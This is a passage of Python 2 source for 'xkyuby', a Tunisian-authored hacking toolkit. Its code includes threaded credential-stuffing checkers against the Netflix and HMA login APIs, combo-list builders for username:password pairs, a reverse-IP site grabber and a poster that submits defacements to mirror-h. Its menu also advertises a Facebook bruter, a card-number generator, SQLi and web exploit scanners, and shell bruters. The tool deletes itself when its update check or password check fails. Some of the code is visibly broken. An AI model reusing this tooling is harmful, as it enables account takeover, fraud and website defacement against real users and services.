         twittor   = requests.get('https://twitter.com/' + str(user), timeout=5)
         if twiitor.status_code == 200:
            self.fight('Twitter',user)
            Bg=1
      except:
          pass
      try:
         sondcloud = requests.get('https://soundcloud.com/' + str(user), timeout=5)
         if sondcloud.status_code == 200:
          self.fight('Soundcloud',user)
          Bg=1
      except:
          pass
      try:
         sarahahah = requests.get('https://%s.sarahah.com/'%str(user), timeout=5)
         if sarahahah.status_code == 200:
            self.fight('Sarahah.com',user)
            Bg=1
      except:
          pass
      try:
         sarahaha2 = requests.get('http://%s.saraha.online/'%str(user), timeout=5)
         if sarahaha2.status_code == 200:
          self.fight('Saraha.online',user)
          Bg=1
      except:
          pass
      if Bg==0:
        self.peace(user)
        x.write("Result: 0\n")
      x.write("------Thnx To Franxx Tool------\n")
      raw_input(fy+'Press Enter To Exit..'+fb);exit()
  def logo(self):
    print """{re}
  x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  x{b}XXX     {g}A{c}ll{g}F{c}or{g}O{c}ne {g}C{c}hecker     {b}XXX{re}X
  x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}X
  X{y}     Check any username          {re}X
  X{y}     registred in SocialMedia    {re}X
  X{y}     Avaible :                   {re}X
  X{re}     ~{r}> {y}Instagram                {re}X
  X{re}     ~{r}> {y}Facebook                 {re}X
  X{re}     ~{r}> {y}Twitter                  {re}X
  X{re}     ~{r}> {y}Youtube Channel          {re}X
  X{re}     ~{r}> {y}Telegram                 {re}X
  X{re}     ~{r}> {y}Sarahah.com              {re}X
  X{re}     ~{r}> {y}Saraha.online            {re}X
  X{r}         [{y}ctrl-c: Back{r}]          {re}X
  x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  """.format(r=la7mar,b=lazra9,g=la5dhar,y=lasfar,re=ramadi,m=movv,c=cyan,bl=blid)
##
class heroken(object):
  def __init__(self):
      self.logo()
      msf=str(raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker)))
      if msf in ['01','1']:
        self.comed()
      elif msf in ['02','2']:
        self.rm_spc()
        self.rm_dup()
      elif msf in ['03','3']:
        self.extrer()
      elif msf in ['04','4']:
        EscanorSamata()
      elif msf in ['05','5']:
        skykeyz()
      elif msf in ['06','6']:
        self.nojetsu()
      elif msf in ['07','7']:
        transformator()
      elif msf in ['08','8']:
        self.tedit()
  def logo(self):
    #~~Franxx's Logo~~#
   print """{bl}
  {re}x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x  
  X{r}( {b}01 {r}){y}  Make Combo                        {re}X
  X{r}( {b}02 {r}){y}  Remove Dupliques and spaces       {re}X
  X{r}( {b}03 {r}){y}  Extract (Emails/users) & passwords{re}X
  X{r}( {b}04 {r}){y}  Multi Extractor(Combo/Proxy/EMail){re}X
  X{r}( {b}05 {r}){y}  Keyword List Maker                {re}X
  X{r}( {b}06 {r}){y}  Grab List With `n` Lines          {re}X
  X{r}( {b}07 {r}){y}  Exchanger(user <=> email)         {re}X
  X{r}( {b}08 {r}){y}  HTTP/HTTPS ListEditor             {re}X
  x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  """.format(r=la7mar,b=lazra9,g=la5dhar,y=lasfar,re=ramadi,m=movv,c=cyan,bl=blid)   
  def comed(self):
    try:
      user1 =raw_input("%s[%s+%s] Enter userlist : %s"%(la7mar,la5dhar,la7mar,lazra9))
      with open(user1,'r') as zackk:
        zack=zackk.read().splitlines()
      pass2 =raw_input("%s[%s+%s] Enter passlist : %s"%(la7mar,la5dhar,la7mar,lazra9))
      with open(pass2,'r') as zackkk:
        zack2=zackkk.read().splitlines()
    except:
      rakez()
    try: 
      for z in zack:
         for y in zack2:
          zz  = z+(':')+y
          zz0=open('results/combos/combo.txt','a')
          zz0.write(zz+'\n')
          nb=nb+1
      print "%sYour List(%s Lines) Saved In 'results/combos' "%(la5dhar,nb)
      raw_input(fy+'Press Enter To Exit..'+fb);exit()
    except:
       pass
  def rm_spc(self):
   if not os.path.isdir('results/combos'):
          os.mkdir('results/combos')
   zaw =raw_input("%s[%s+%s] Enter list : %s"%(la7mar,la5dhar,la7mar,lazra9))
   try:
    comboo=open(zaw,'r')
   except:
    print "{!} Error File";exit()
   for z in comboo:
     mark ="".join(re.split("\s+",str(z), flags=re.UNICODE))
     zz0=open('results/combos/comboa.txt','a')
     zz0.write(mark +'\n')
  def rm_dup(self):
   nb_rm=0
   with open('results/combos/comboa.txt','r') as result:
        uniqlines = set(result.readlines())
        with open('results/combos/_combo.txt', 'a') as comboa:
         comboa.writelines(set(uniqlines))
        os.remove('results/combos/comboa.txt')
   combo2o=[]
   with open('results/combos/_combo.txt','r') as combo2o:
    for i in combo2o:
     nb_rm+=1
   print "%sYour List(%s Lines) Saved In 'results/combos/_combo.txt' "%(la5dhar,nb_rm)
   raw_input(fy+'Press Enter To Exit..'+fb);exit()
  def extrer(self):
     nb=0
     if not os.path.isdir('results/combos'):
          os.mkdir('results/combos')
     user1 =raw_input("%s[%s+%s] Enter List Combo : %s"%(la7mar,la5dhar,la7mar,lazra9))
     try:
        zack = open(user1,'r')
     except:
        print "{!} Error File";exit()
     for z in zack:
       try:
         fr = z.index(':')
         ar = z[0:fr]
         ded = z[fr:]
         de  = ded[1:]
         arlis=open('results/combos/emails.txt','a')
         arlis.write(ar.strip() + '\n')
         delis=open('results/combos/pass.txt','a')
         delis.write(de.strip() + '\n')
         nb=nb+1
       except:
        pass
     print "%sYour List(%s Lines) Saved In 'results/combos' "%(la5dhar,nb)
     raw_input(fy+'Press Enter To Exit..'+fb);exit()
  
  def sajel(self, ii,j,fiileout):
   doct='results/Listgrouped/%s/disco%s.txt'%(fiileout,str(j))
   toka=open(doct,'a')
   toka.write(ii+'\n')
  def nojetsu(self):
   if not os.path.isdir('results/Listgrouped'):
    os.mkdir('results/Listgrouped')
   print """
  {re}
  x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y}   Kage Benchinn No Jetsu   {re}X
  x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  """.format(r=la7mar,y=lasfar,re=ramadi)
   fiile=raw_input("%s[%s+%s] Enter list : %s"%(la7mar,la5dhar,la7mar,lazra9))
   fiileout=raw_input("%s[%s+%s] Enter Name of Dictory To Output : %s"%(la7mar,la5dhar,la7mar,lazra9))
   while len(fiileout) ==0:
    fiileout=raw_input("%s[%s+%s] Enter Name of Dictory To Output : %s"%(la7mar,la5dhar,la7mar,lazra9))
   os.mkdir('results/Listgrouped/'+str(fiileout))
   try:
    with open(fiile,'r') as openfiile:
     yoo = openfiile.read().splitlines()
   except:
    print "{!} Error File";exit()
   fillro=raw_input("%s[%s+%s] Number Lines : %s"%(la7mar,la5dhar,la7mar,lazra9))
   i=1
   j=1
   for ii in yoo:
    if i==int(fillro):
        i=1
        self.sajel(ii,j,fiileout)
        j=j+1
    else:
        self.sajel(ii,j,fiileout)
        i=i+1
   print "%sYou Have %s Files In 'results/Listgrouped/%s' \033[00m"%(la5dhar,j,fiileout)
   raw_input(fy+'Press Enter To Exit..'+fb);exit()
  def tedit(self):
   if not os.path.isdir('results/Sites'):
    os.mkdir('results/Sites')
   print """
  {re}
  x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
  X{y}    HTTP - HTTPs - NoHttp   {re}X
  x{r}XXXXXXXXXXXXXXXXXXXXXXXXXXXX{re}x
    x{r}XXXXXXXXXXXXXXXXXXXXXXXX{re}x
    X{r} ({b} 01 {r}){y} Add HTTP        {re}X
    X{r} ({b} 02 {r}){y} Remove HTTP(s)  {re}X
    X{r} ({b} 03 {r}){y} Cleaner         {re}X
    X{r} ({b} 69 {r}){y} Back            {re}X
    x{r}XXXXXXXXXXXXXXXXXXXXXXXX{re}x
  """.format(r=la7mar,y=lasfar,re=ramadi,b=lazra9)
   mayar=raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker))
   if not mayar in ['1','01','2','02','3','03','69']:
    rakez()
    pass
   fiile=raw_input("%s[%s+%s] Enter list : %s"%(la7mar,la5dhar,la7mar,lazra9))
   try:
     with open(fiile,'r') as openfiile:
      yoo = openfiile.read().splitlines()
   except:
    print "{!} Error File";exit()
   if mayar in ['1','01']:
    for i in yoo:
      if not i.startswith("http://") or i.startswith("https://"):
        with open("results/Sites/(%s).txt"%fiile,'a') as aaa:
          aaa.write('http://%s\n'%i)
      else:
        with open("results/Sites/(%s).txt"%fiile,'a') as aaa:
          aaa.write(i)
   elif mayar in['2','02']:
    for i in yoo:
      if i.startswith("http://") or i.startswith("https://"):
        i=i.lower()
        i=i.replace("http://","");i=i.replace("https://","")
        with open("results/Sites/(%s).txt"%fiile,'a') as aaa:
          aaa.write('http://%s\n'%i)
      else:
        with open("results/Sites/(%s).txt"%fiile,'a') as aaa:
          aaa.write(i)
   elif mayar=='3':
    for i in yoo:
      zz=i.split("");
      for ii in zz:
        i=i.lower()
        i=i.replace("http://","");i=i.replace("https://","")
        with open("results/Sites/(%s).txt"%fiile) as aaa:
          aaa.write('http://'+i.split("/")[0])
   elif mayar=='69':
    heroken()
def fitromailon(x, y):
    if x!=0 :
      print "   %s[%s+%s]%s %s : %s"%(la7mar,lazra9,la7mar,la5dhar,y,x)

def filtmail():
   nb=0
   notmail=0
   Yahoo=0
   Mailru=0
   inboxru=0
   bkru=0
   hotmail=0
   live=0
   outlook=0
   seznamcz=0
   gmail=0
   orangefr=0
   yandex=0
   gmx=0
   icloud=0
   TunisienShitt=0
   aol=0
   freefr=0
   rambler=0
   citromailhu=0
   cncom=0
   Freenetde=0
   freemailhu=0
   abv=0
   tonlinede=0
   op=0
   onet=0
   vp=0
   other=0
   print """{r}
  __ _ _ _             ___  ___      _ _ 
 / _(_) | |            |  \/  |     (_) |
| |_ _| | |_ _ __ ___  | .  . | __ _ _| |
|  _| | | __| '__/ _ \ | |\/| |/ _` | | |
| | | | | |_| | |  __/ | |  | | (_| | | |
|_| |_|_|\__|_|  \___| \_|  |_/\__,_|_|_|
                                         
                           {g} ~~Escanor~~

   """.format(r=fr,g=fg)
   burn =str(raw_input("%s[%s+%s] Enter list : %s"%(la7mar,la5dhar,la7mar,lazra9)))
   if not os.path.isdir('results/filtres'):
    os.mkdir('results/filtres')
   with open(burn, 'r') as earth:
      file = earth.read().splitlines()
   for fade in file:
    fade=fade.lower()
    nb=nb+1
    try:
     if '@' not in str(fade):
        notmail=notmail+1
     elif '@yahoo.' in str(fade):
        Yahoo=Yahoo+1
        zzz=open('results/filtres/yahoo.txt','a')
        zzz.write(fade+'\n')
     elif '@mail.ru' in str(fade):
        Mailru=Mailru+1
     elif  '@inbox.ru' in str(fade):
        inboxru=inboxru+1
        zzz=open('results/filtres/inbox.ru.txt','a')
        zzz.write(fade+'\n')
     elif  '@bk.ru' in str(fade):
        bkru=bkru+1
        zzz=open('results/filtres/bk.ru.txt','a')
        zzz.write(fade+'\n')
     elif  '@hotmail' in str(fade):
        hotmail=hotmail+1
        zzz=open('results/filtres/hotmail.txt','a')
        zzz.write(fade+'\n')
     elif  '@live' in str(fade):
        live=live+1
        zzz=open('results/filtres/live.txt','a')
        zzz.write(fade+'\n')
     elif  '@outlook' in str(fade):
        outlook=outlook+1
        zzz=open('results/filtres/outlook.txt','a')
        zzz.write(fade+'\n')
     elif '@seznam.cz' in str(fade):
        seznamcz=seznamcz+1
        zzz=open('results/filtres/seznam.cz.txt','a')
        zzz.write(fade+'\n')
     elif '@gmail.com' in str(fade):
        gmail=gmail+1
        zzz=open('results/filtres/gmail.com.txt','a')
        zzz.write(fade+'\n')
     elif '@orange.' in str(fade):
        orangefr=orangefr+1
        zzz=open('results/filtres/orange.fr.txt','a')
        zzz.write(fade+'\n')
     elif '@yandex.' in str(fade):
        yandex=yandex+1
        zzz=open('results/filtres/yandex.txt','a')
        zzz.write(fade+'\n')
     elif '@gmx.' in str(fade):
        gmx=gmx+1
        zzz=open('results/filtres/gmx.txt','a')
        zzz.write(fade+'\n')
     elif '.tn' in str(fade):
        TunisienShitt=TunisienShitt+1
        zzz=open('results/filtres/tona.txt','a')
        zzz.write(fade+'\n')
     elif '@aol.' in str(fade):
        aol=aol+1
        zzz=open('results/filtres/aol.txt','a')
        zzz.write(fade+'\n')
     elif '@free.fr' in str(fade):
        freefr=freefr+1
        zzz=open('results/filtres/free.fr.txt','a')
        zzz.write(fade+'\n')
     elif '@rambler.' in str(fade):
        rambler=rambler+1
        zzz=open('results/filtres/rambler.txt','a')
        zzz.write(fade+'\n')
     elif '@citromail.hu' in str(fade):
        citromailhu=citromailhu+1
        zzz=open('results/filtres/citromail.txt','a')
        zzz.write(fade+'\n')
     elif '@21cn.com' in str(fade):
        cncom=cncom+1
        zzz=open('results/filtres/21cn.com.txt','a')
        zzz.write(fade+'\n')
     elif '@freenet.de' in str(fade):
        Freenetde=Freenetde+1
        zzz=open('results/filtres/freenet.de.txt','a')
        zzz.write(fade+'\n')
     elif '@freemail.hu' in str(fade):
        freemailhu=freemailhu+1
        zzz=open('results/filtres/freemail.hu.txt','a')
        zzz.write(fade+'\n')
     elif '@abv.bg' in str(fade):
        abv=abv+1
        zzz=open('results/filtres/abv.bg.txt','a')
        zzz.write(fade+'\n')
     elif '@icloud' in str(fade):
        icloud=icloud+1
        zzz=open('results/filtres/icloud.txt','a')
        zzz.write(fade+'\n')
     elif '@t-online.de' in str(fade):
        tonlinede=tonlinede+1
        zzz=open('results/filtres/t.online.txt','a')
        zzz.write(fade+'\n')
     elif '@op.' in str(fade):
        op=op+1
        zzz=open('results/filtres/op.txt','a')
        zzz.write(fade+'\n')
     elif '@onet.' in str(fade):
        onet=onet+1
        zzz=open('results/filtres/onet.txt','a')
        zzz.write(fade+'\n')
     elif '@vp' in str(fade):
        vp=vp+1
        zzz=open('results/filtres/vp.txt','a')
        zzz.write(fade+'\n')
     else:
        other=other+1
        zzz=open('results/filtres/other.txt','a')
        zzz.write(fade+'\n')
    except:
            pass
   nouwa=Yahoo+Mailru+inboxru+bkru+hotmail+live+outlook+seznamcz+gmail+orangefr+yandex+gmx+TunisienShitt+aol+freefr+rambler+citromailhu+cncom+Freenetde+freemailhu+abv+tonlinede+op+onet+vp+other
   print"%s   [%s+%s] %sTotal Emails : %s"%(la7mar,lazra9,la7mar,la5dhar,nouwa)
   fitromailon(Yahoo, 'Yahoo')
   fitromailon(Mailru, 'Mail.ru')
   fitromailon(inboxru, 'Inbox.ru')
   fitromailon(bkru, 'bk.ru')
   fitromailon(hotmail, 'Hotmail')
   fitromailon(live, 'Live')
   fitromailon(outlook, 'Outlook')
   fitromailon(seznamcz, 'seznam.cz')
   fitromailon(gmail, 'Gmail')
   fitromailon(icloud, 'Icloud')
   fitromailon(orangefr, 'Orange.fr')
   fitromailon(yandex, 'Yandex')
   fitromailon(gmx, 'Gmx')
   fitromailon(TunisienShitt, 'Tunisien Shits')
   fitromailon(aol, 'Aol')
   fitromailon(freefr, 'Free.fr')
   fitromailon(citromailhu,'citromailhu')
   fitromailon(rambler, 'Rambler')
   fitromailon(cncom, '21cn.com')
   fitromailon(Freenetde, 'Freenetde')
   fitromailon(freemailhu, 'Freemail.hu')
   fitromailon(abv, 'Abv.bg')
   fitromailon(tonlinede, 'T-online.de')
   fitromailon(op, 'op')
   fitromailon(onet, 'Onet')
   fitromailon(vp, 'Vp')
   fitromailon(other, 'Speciel Domains')
   fitromailon(notmail, 'Not E-Mail')
   raw_input(fy+'Press Enter To Exit..'+fb);exit()
class tepayo(object):
 def __init__(self):
    try:
     lsz=open('ips_.txt','r')
     for i in lsz:
        weblis.append(i)
    except:
        pass
    self.lirelist()

 def get_ip(self,site):
  ip=socket.gethostbyname(str(site))  
  return ip
 def withouthttp(self,site):
  site = httperr(site); return(site)
 def withhttp(self,site):
    site = httperr(site)
    site = ("http://" + str(site)+'/'); return(site)
    return(website)
 def lirelist(self):
  global weblis
  lis=str(raw_input('{b}[{g}Website List >>{b}]{w} '.format(b=fbl,g=fg,w=fb)) )
  try:
    lislis=open(lis,'r').read().splitlines()
  except:
    print "{!} Error File";exit()
  for site in lislis:
                site=self.withouthttp(site)
                try:
                  yoo=self.get_ip(site)
                  print fr+"[IP]:%s%s"%(fb,yoo)
                  if yoo not in weblis:
                   weblis.append(yoo)
                   with open('ips_.txt','a') as aa:
                    aa.write(yoo+'\n')
                  else:
                    pass
                  self.hackapi(site)
                except:
                        pass
 def hackapi(self,up):
    url = "http://api.hackertarget.com/reverseiplookup/?q="
    combo = "{url}{website}".format(url=url, website=up)
    request = requests.get(combo,timeout=5).text.encode('utf-8')
    if len(request) != 2:
        list = request.strip("").split("\n")
        for _links in list:
            if len(_links) != 0:
                print "{*} Site : %s"%(_links)
                if _links not in httplis:
                    httplis.append(_links)
                with open('sites_.txt','a') as aaa:
                    aaa.write(_links+'\n')
                if itstona=='vuln':
                    sama(_links)
                else:
                    pass
            else:
                print "{!} Cant Find Another Domains With '%s'  "%website
    else:
        print fr+"{!} Cant Find Another Domains With '%s'+fb  "%website;exit()

def netflix(usr,passwd,proxy):
 data={
 'email':usr,'password':passwd,'secureNetflixId':'v=2','netflixId':'v=2'
 }
 anon=requests.get("https://android.prod.cloud.netflix.com/android/samurai/config?path=['signInVerify']&appVersion=6.0.0",data=data).text.encode('utf-8')
 if 'memberHome' in anon:
  print fbl+"["+fg+"WOPPA!"+fbl+"] ~>"+fb+combo
  with open('netflix.txt','a') as zz:
      zz.write(combo)
 else:
  print fg+"["+fr+"Failed!"+fg+"] ~>"+fb+combo

def hma (usr,passwd,proxy):
 data={
 'username':usr,'password':passwd,
 }
 anon=requests.get("https://mobile.api.hmageo.com/clapi/v1.5/user/login",data=data).text.encode('utf-8')
 if 'plan' in anon and 'Months' in anon:
  print fbl+"["+fg+"WOPPA!"+fbl+"] ~>"+fb+combo
  with open('hma.txt','a') as zz:
      zz.write(combo)
 else:
    print fg+"["+fr+"Failed!"+fg+"] ~>"+fb+combo 

def Threatoo(x):
 print fbl+" X"+fg+("="*45)+fbl+"X\n"+fb
 thrrd=int(raw_input(strounga('Threads[max:200] :','')))
 if thrrd>200:
    thrrd=200
 elif thrrd==0 or len(str(thrrd))==0:
    thrrd=1

 list=raw_input(strounga('Combo List : ',''))
 try:
    listme=open(list,'r').read().splitlines()
 except:
    print fr+"Enter a Valid List ..."+fb
    exit()
 thread = [];la77dha=0
 for combo in listme:
     try:
         user=combo.split(':')[0]
         passwd=combo.split(':')[1]
     except:
         pass
     if la77dha >=len(proxls):
         la77dha=0
     proxy=proxls[la77dha];la77dha+=1;
     try:
                t = threading.Thread(target=x, args=(user, passwd,proxy))

                t.start()
                thread.append(t)
                time.sleep(0.1)
     except:
                pass
     for j in thread:
            j.join()
def mirrohh():
    defaceer=raw_input(strounga('Defacer : ',''))
    zz=open(raw_input(strounga('List Sites : ','')),'r').read().splitlines()
    for i in zz:
        hodhod={
        'Host':'mirror-h.org',
        'Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Accept-Encoding':'gzip, deflate, br','Referer':'https://mirror-h.org/multiple/'
        }
        data={
        'user':defaceer,'url':i    }
        anon=requests.get('https://mirror-h.org/site-send/',data=data,Headers=hodhod).text.edncode-('utf-8')
def Follwww():
     
    
    print strounga("We Are   :","   + Escanor Sama (Oussama Ben Mahmoud) ~> tsuminor@gmail.com")
    print strounga("         :","   + Aron-Tn (Amir Othman) ~> Aron-tn@protonmail.com")
    print strounga("         :","   + M4rkWalker (Z4ckarya Addala) ~> Dream0@protonmail.com")
    print strounga("Facebook :","   + [https://fb.com/meliodas404]")
    print strounga("         :","   + [https://fb.com/amir.othman.official]")
    print strounga("         :","   + [https://fb.com/officiel.m4rk]")
    print strounga("Credit   :","   + X4priv8 project / M4rkWalker / Musliman Coderz And Hackerz")
    print strounga("Github   :","   + https://github.com/m4rktn | https://github.com/0xtn | https://github.com/aron-tn")
    print strounga("(c)opyright "," + 4/01/2019")
    raw_input('[Press Enter To Exit]');webbrowser.open_new_tab('https://www.youtube.com/channel/M4rkWalker');webbrowser.open_new_tab('https://www.facebook.com/amir.othman.official');webbrowser.open_new_tab('https://www.facebook.com/meliodas404');exit()
update_____________A="infintyW4r4000000000004"
def mli7(): 
 if not os.path.isdir('results/'):
      os.mkdir('results/')
 else:
      pass
 try:
   zz=requests.get('https://raw.githubusercontent.com/0xtn/xkyuby/master/code.py')
   if update_____________A not in zz.text.encode('utf-8'):
    print "{r} Alert ! New Update For This Tool ... Bug Fixed & Some Tools Added ... \n{y}Please Contact The Coders \n{r} If You Buy This Tool From Seller You Can Receive Update (price : 2$)".format(r=la7mar,g=la5dhar,y=la7mar,re=ramadi)
    time.sleep(3);os.remove(sys.argv[0]);os.remove(os.getcwd())
 except:
            pass
 print """\n{y}

  d88888D  .d8b.  d8888b.  .d8b.  d8888b.  .d88b.  d888888b 
  YP  d8' d8' `8b 88  `8D d8' `8b 88  `8D .8P  88. `~~88~~' 
     d8'  88ooo88 88oooY' 88ooo88 88oooY' 88  d'88    88    
    d8'   88~~~88 88~~~b. 88~~~88 88~~~b. 88 d' 88    88    #badla 
   d8' db 88   88 88   8D 88   88 88   8D `88  d8'    88    
  d88888P YP   YP Y8888P' YP   YP Y8888P'  `Y88P'     YP  
                {b}{time}  
        {b}*{g}--- {y}Welc0me To xkyuby {r}({y}X4priv8 V3{r}) {g}---{b}*  
        {b}Coded By {g}+ {y}Escanor{r}({y}Oussama Ben Mahmoud{r})  
                 {g}+ {y}ARON-TN{r}({y}Amir Othman{r})
                 {g}+ {y}M4rkWalker{r}({y}Z4ckarya Addala{r})      
{b}>{g}--- {y}We do not take any responsibility for any ilegal act {g}---{b}<""".format(time=timer(),y=fy,r=fr,b=fbl,g=fg)
 print strounga("01","Filtre Mail (+25)")+(' '*9)+strounga("02","Hash-Identify")
 print strounga("03","SMTP Sender")+(' '*15)+strounga("04","Sarahah Sender")
 print strounga("05","Saraha.online Sender")+(' '*6)+strounga("06","XSmash FB ToolBox")
 print strounga("07","Combo&List MultiEditor")+(' '*4)+strounga("08","Username Checker")
 print strounga("09","CC Generator")+(' '*14)+strounga("10","Key Generator")
 print strounga("11","Facebook Bruter")+(' '*11)+strounga("12","Netflix Checker")
 print strounga("13","Instagram Checker")+(' '*9)+strounga("14","HMA Checker(combo)")
 print strounga("15","Proxy Grabber")+(' '*13)+strounga("16","Proxy Checker")
 print strounga("17","SMTP checker & Bruter")+(' '*5)+strounga("18","Web Scanner & Exploiter(+700)")
 print strounga("19","WPScanner")+(' '*17)+strounga("20","JoomScanner")
 print strounga("21","Dorker (with list)")+(' '*8)+strounga("22","SQLI Scanner")
 print strounga("23","Config Grabber")+(' '*12)+strounga("24","Email Crawler ")
 print strounga("25","AdminPanel Finder&Bruter")+(' '*2)+strounga("26","Config Finder")
 print strounga("27","TENA (FastsiteGrabber)")+(' '*4)+strounga("28","Zone-h Grabber")
 print strounga("29","Zone-h Poster")+(' '*13)+strounga("30","Mirror-h Grabber")
 print strounga("31","Mirror-h Poster")+(' '*11)+strounga("32","Python Modules Fixer")
 print strounga("33","Wso Shell Bruter")+(' '*10)+strounga("34","Shell Finder")
 print strounga("35","Config2AdminDB")+(' '*12)+strounga("36","Get Config Deja Grabbed")
 print strounga("00","About && Contact Coderz")
 Konoshiwa=str(raw_input('{b}[{hh}{g}>>{s}{b}]{w} '.format(b=fbl,g=fg,w=fb,hh=hell,s=saker)) )
 if Konoshiwa in ['1','01']:
  filtmail()
 elif Konoshiwa in ['2','02']:
  if os.name=='nt':
    os.system('python h.py')
  else:
    os.system('python2 h.py')
 elif Konoshiwa in ['3','03']:
  wwwooooo()
 elif Konoshiwa in ['4','04']:
  os.system('perl esc.pl -m 16')
 elif Konoshiwa in ['5','05']:
  os.system('perl esc.pl -m 14')
 elif Konoshiwa in ['6','06']:
  xsmash()
 elif Konoshiwa in ['7','07']:
  heroken()
 elif Konoshiwa in ['8','08']:
  allforone()
 elif Konoshiwa in ['9','09']:
  ccSama()
 elif Konoshiwa =='10':
  zeroeye()
 elif Konoshiwa =='11':
  os.system('perl esc.pl -m 11')
 elif Konoshiwa =='12':
  Threatoo(netflix)
 elif Konoshiwa =='13':
  print ""
 elif Konoshiwa =='14':
  Threatoo(hma)
 elif Konoshiwa =='15':
  ghrab()
 elif Konoshiwa =='16':
  roxycheck()
 elif Konoshiwa =='17':
  if os.name=='nt':
    os.system('python smtp.py')
  else:
    os.system('python2 smtp.py')
 elif Konoshiwa =='18':
    os.system('perl xkyuby.pl')
 elif Konoshiwa =='19':
  kharoutouu()
 elif Konoshiwa =='20':
  JoomScan()
 elif Konoshiwa =='21':
  os.system('perl esc.pl -m 6')  
 elif Konoshiwa =='22':
  os.system('perl esc.pl -m 10')
 elif Konoshiwa =='23':
  os.system('perl esc.pl -m 9')
 elif Konoshiwa =='24':
  os.system('perl esc.pl -m 13')
 elif Konoshiwa =='25':
  os.system('perl esc.pl -m 1')
 elif Konoshiwa =='26':
  os.system('perl esc.pl -m 5')
 elif Konoshiwa =='27':
  tepayo()
 elif Konoshiwa =='28':
  deffff=raw_input(strounga('Deface : ',''))
  while len(deffff)==0:
    deffff=raw_input(strounga('Deface : ',''))
  phphhh=raw_input(strounga('PHPSESSID : ',''))
  while len(phphhh)==0:
    phphhh=raw_input(strounga('PHPSESSID : ',''))
  zheeee=raw_input(strounga('ZHE : ',''))
  while len(zheeee)==0:
    zheeee=raw_input(strounga('ZHE : ',''))
  if os.name=='nt':
    os.system('python zone.py %s %s'%(zheeee,phphhh))
  else:
    os.system('python2 zone.py %s %s'%(zheeee,phphhh))
 elif Konoshiwa =='29':
  os.system('perl esc.pl -m 7')
 elif Konoshiwa =='30':
  os.system('perl esc.pl -m 4')
 elif Konoshiwa =='31':
  mirrohh()
 elif Konoshiwa =='32':
  if os.name=='nt':
    os.system('bash fixer.sh')
  else:
    os.system('chmod 777 fixer.sh && ./fixer.sh')
 elif Konoshiwa =='33':
  os.system('perl esc.pl -m 8')
 elif Konoshiwa =='35':
  os.system('perl esc.pl -m 15')
 elif Konoshiwa =='34':
  os.system('perl esc.pl -m 2')
 elif Konoshiwa =='36':
  os.system('perl esc.pl -m 3')
 elif Konoshiwa in ['00','0']:
  Follwww()
 else:
    mli7()
slowprint ("\n\t                       New xkyuby Tool") 
slowprint ("\n\t        Coded By ./ARON-TN && ESCaN0r\n")
slowprint ("                         #Tunisian_Coderz")

slowprint('           Connecting .......')
foul()
#####################
print("""{g}
             ____________________________________________________
            *                                                    *
           |    _____________________________________________     |
           |   |                                             |    |
           |   |  {r}C:\ python xkyuby.py    {g}                     |    |
           |   |        {r} * Welcome xkyuby     {g}              |    |
           |   |        {r} ** We Are ** 
           |   |        {r}  ARON-TN & ESCAN0R & M4rkWalker{g}  	|    |
           |   |        {r} * Message:              {g}            |    |
           |   |         {r}You Have Just 3Tries    {g}            |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   | {r} c:\ shutdown              {g}                 |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'""").format(r=fr,g=fg)
par = raw_input("{y}Input Password to continue > {w}".format(r=fr,y=fy,w=fw));n=0
while(par!=GenPass):
    if n==2:
        print("""{r}OOOOOOPPPPs
     (_\     /_)
       ))   ((
     .-*******-.  
 /^\/  _.   _.  \/^\  {g}File Has Been Removed :v {r}({g}i hope that u havent a backup.zip{r})
 \(   /__\ /__\   )/  
  \,  \o_/_\o_/  ,/   
    \    (_)    /     
     `-.'==='.-'
      __) - (__   {g}If U Have Any question contact Us{r}
     /  `~~~`  \  {g}Escanor : {y}tsuminor@gmail.com{r}
    / ,       , \ {g}Aron-TN : {y}Aron-tn@protonmail.com{r}
    \ :       ; /
     \|==(*)==|/
      :       :
       \  |  /
     ___)=|=(___
    (____/ \____)""".format(r=fr,g=fg,y=fy));webbrowser.open_new_tab('https://www.facebook.com/amir.othman.official');webbrowser.open_new_tab('https://www.facebook.com/meliodas404');os.remove(sys.argv[0]);exit()
    n+=1;par=raw_input("{r}Password wrong {n}\n{y}Input Password to continue > {w}".format(r=fr,y=fy,w=fw,n=n))
try:
 mli7()
except KeyboardInterrupt:
    rakez()

